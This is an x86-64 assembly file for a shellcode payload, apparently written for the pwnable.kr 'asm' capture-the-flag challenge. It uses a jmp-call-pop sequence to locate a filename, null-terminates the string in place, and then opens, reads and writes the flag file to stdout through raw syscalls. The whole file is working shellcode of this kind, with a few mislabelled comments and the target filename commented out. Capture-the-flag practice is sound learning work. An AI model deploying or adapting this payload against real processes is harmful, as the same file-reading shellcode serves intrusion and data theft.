;Author: Weston Silbaugh
;the asm for our shellcode payload
	section .mysec write exec alloc
	global	main

main:
	jmp		push_vars
s1:
;add null char
	xor		rax, rax
	pop		rbx
	push 		rbx
	add		bx,231
	mov		[ebx],eax
;open:
	add		al, 0x02	;sys_open
	pop		rdi		;const char *fname
	push 		rdi
	xor		rsi, rsi	;int flags
	xor		rdx, rdx	;int mode
	syscall
;read:
	mov		rdi, rax	;int fd
	xor		rax, rax	;sys_read
	pop		rsi		;buff
	push 		rsi
	add		dx, 400		;size
	syscall
;write:
	xor		eax, eax
	add 		al, 0x01	;sys_read
	xor		rdi, rdi
	add		rdi, 1		;int fd
	pop		rsi		;buff
	;mov		rdx, 128	;size
	syscall
exit:
	xor		rax, rax
	xor		rdi, rdi
	add		al, 60
	syscall
;vars

push_vars:
;	call push_fname
;buff:
;	times 64 db 0x90

push_fname:
	call	s1
fname:
	;db "/home/nuser/ctf/progress/pwnable.kr/asm/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
nullchar:
	db "a"
